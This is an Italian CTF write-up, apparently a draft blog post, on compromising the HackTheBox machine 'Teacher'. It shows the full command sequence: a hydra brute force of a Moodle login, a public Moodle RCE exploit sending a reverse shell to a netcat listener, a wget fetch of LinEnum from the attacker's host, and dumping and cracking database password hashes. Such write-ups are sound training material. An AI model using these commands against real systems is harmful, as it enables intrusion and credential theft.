---
layout:     post
title:      "Teacher - HackTheBox"
date:       2019-07-05 02:42:07
categories: ctf hackthebox machine sqlinjection
draft: true
---

Teacher è una macchina Linux da 20 punti con indirizzo ip `10.10.10.153`

![Teacher](/images/htb-teacher/teacher.png)

Facciamo uno scan delle porte con nmap:
![Scan](/images/htb-teacher/scan.png)

C'è un web server in esecuzione sulla porta 80, visitiamolo:
![Web](/images/htb-teacher/web.png)

Navigando tra le pagine del sito vediamo un immagine mancante nella sezione
gallery:
![Gallery](/images/htb-teacher/gallery.png)

Andando a leggere il sorgente, notiamo che nel caso in cui non venga caricata
correttamente quell'immagine, verrà loggato un messaggio nella console del
browser:
![Source](/images/htb-teacher/source.png)

Vediamo allora cosa contiene il file:
![Source](/images/htb-teacher/5.png)

Abbiamo quindi una password che inizia con `Th4C00lTheacha` e a cui manca un
carattere.

Continuiamo la nostra ricerca e lanciamo un tool per cercare eventuali directory
o file esposti (io uso [ffuf](https://github.com/ffuf/ffuf) ma vanno bene anche
[dirsearch](https://github.com/maurosoria/dirsearch),
[gobuster](https://github.com/OJ/gobuster) o altri):
![Discovery](/images/htb-teacher/discovery.png)

Notiamo le directory phpmyadmin, che però risponde con codice `403 Access denied`,
e la directory moodle:
![Moodle](/images/htb-teacher/moodle.png)

Moodle è un CMS usato dagli istutiti scolastivi, in genere per pubblicare
materiale sui vari corsi.
Provando a fare il login vediamo che c'è la possibilità di entrare come ospite:
![Login](/images/htb-teacher/login.png)

Provando a navigare tra le varie sezioni non scopriamo niente di nuovo in quanto
ci viene comunque chiesto di eseguire il login.

Il corso di Algebra ha come professore Giovanni Chhatta, lo stesso nome che che
c'era nel messaggio nascosto nell'immagine `5.png`. Abbiamo anche parte della
password.

Usiamo [crunch](https://github.com/crunchsec/crunch) per generare le possibili
password. Crunch sostituisce alcuni simboli con un set di caratteri predefinito:
* `@` caratteri minuscoli
* `,` caratteri maiuscoli
* `%` numeri
* `^` simboli

![Crunch](/images/htb-teacher/crunch.png)

Usiamo [hydra](https://github.com/vanhauser-thc/thc-hydra) per eseguire trovare
la password giusta:
```
vagrant@kali:~$ hydra -t 8 -l Giovanni -P passwords.txt http-form-post://10.10.10.153 -f -m "/moodle/login/index.php:username=^USER^&password=^PASS^:Invalid"
```
Scopriamo che la password è "Th4C00lTheacha#". Facendo il login e dando un'occhiata in giro non si trova niente di utile. Andando sulla pagina del corso di Algebra, in basso c'è in link che dice "Moodle Docs for this page". Cliccandolo ci porta alla documentazione di Moodle 3.4. Cerchiamo se c'è qualche vulnerabilità nota su exploitdb. 
Troviamo un exploit che permette RCE, che sfrutta l'esecuzione di codice nella creazione di un quiz sul portale. Ecco il link
https://www.exploit-db.com/exploits/46551

L'exploit di default esegue una reverse shell, dobbiamo quindi mettere netcat in
ascolto sulla nostra macchina:
```
vagrant@kali:~$ nc -nlvp 8081
```

Poi su un altro terminale eseguiamo l'exploit, i parametri ip e port si
riferiscono alla sessione di netcat in ascolto.
```
vagrant@kali:~$ php moodle-3.4.3-rce.php url=http://10.10.10.153/moodle user=Giovanni pass=Th4C00lTheacha# ip=10.10.15.48 port=8081 course=2                                    

*------------------------------*
* Noodle [Moodle RCE] (v3.4.1) *
*------------------------------*

[!] Make sure you have a listener
[!] at 10.10.15.48:8081

[*] Logging in as user Giovanni with password Th4C00lTheacha#                                 
[+] Successful Login
[>] Moodle Session r07l94v8etnshdrrjpr6a22uo5
[>] Moodle Key 3jfgrc2UVo
[*] Loading Course ID 2
[+] Successfully Loaded Course
[*] Enable Editing
[+] Successfully Enabled Course Editing
[*] Adding Quiz
[+] Successfully Added Quiz
[*] Configuring New Quiz
[+] Successfully Configured Quiz
[*] Loading Edit Quiz Page
[+] Successfully Loaded Edit Quiz Page
[*] Adding Calculated Question
[+] Successfully Added Calculation Question
[*] Adding Evil Question
[+] Successfully Created Evil Question
[*] Sending Exploit

[>] You should receive a reverse shell attempt from the target at 10.10.15.48 on port 8081    
[>] If connection was successful this program will wait here until you close the connection.  
[>] You should be able to Ctrl+C and retain the connection through netcat.   
```

L'exploit dovrebbe connettere il server alla nostra sessione di netcat, dandoci
quindi una shell remota, eseguiamo il seguente comando python per spawnare una
shell più utilizzabile:
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

Dovremmo avere la seguente shell:
```
www-data@teacher:/var/www/html/moodle/question$
```

Carichiamo sul server lo script LinEnum.sh per fare enumeration. Per caricarlo, dato che il server non ha
accesso a internet, eseguiamo un web server sul nostro computer nella cartella
dove abbiamo LinEnum.sh, e dall'altra parte scarichiamolo con wget.
```
vagrant@kali:~$ python2 -m SimpleHTTPServer 9999
```

In questo caso 10.10.15.48 è il mio IP
```
www-data@teacher:/tmp$ wget http://10.10.15.48:9999/LinEnum.sh
```

Eseguendo LinEnum scopriamo che possiamo leggere /etc/shadow, ma provando
crackare le password degli utenti giovanni e root con rockyou non si trova
niente.
Vediamo invece che c'è un database mysql in esecuzione, cerchiamo nel file
moodle/config.php la password per connettersi al database e scopriamo che è
"Welkom1!". Connettiamoci allora al database:
```
www-data@teacher:/var/www/html/moodle/question$ mysql -u root -p
```

Vediamo quali database ci sono:
```
MariaDB [moodle]> show databases; 
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
| mysql              |
| performance_schema |
| phpmyadmin         |
+--------------------+
5 rows in set (0.00 sec)
```

Vediamo cosa c'è nel database moodle:
```
MariaDB [moodle]> show tables;
show tables;
+----------------------------------+
| Tables_in_moodle                 |
+----------------------------------+
| mdl_analytics_indicator_calc     |
| mdl_analytics_models             |
| mdl_analytics_models_log         |
| mdl_analytics_predict_samples    |
| mdl_analytics_prediction_actions |
| mdl_analytics_predictions        |
| mdl_analytics_train_samples      |
| mdl_analytics_used_analysables   |
| mdl_analytics_used_files         |
| mdl_assign                       |
               ...
| mdl_user                         |
| mdl_workshopform_accumulative    |
| mdl_workshopform_comments        |
| mdl_workshopform_numerrors       |
| mdl_workshopform_numerrors_map   |
| mdl_workshopform_rubric          |
| mdl_workshopform_rubric_config   |
| mdl_workshopform_rubric_levels   |
+----------------------------------+
388 rows in set (0.01 sec)

MariaDB [moodle]>
```

Controlliamo la tabella mdl_user:
```
MariaDB [moodle]> select username, password from mdl_user;                                                                                                                                                           
+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
4 rows in set (0.00 sec)

MariaDB [moodle]>
```

Copiamo gli hash in un file e proviamo a crackarli con john the ripper usando la
solita wordlist rockyou
```
vagrant@kali:~$ john dbpasswords.txt --wordlist=rockyou.txt
```

Scopriamo che la password è expelled
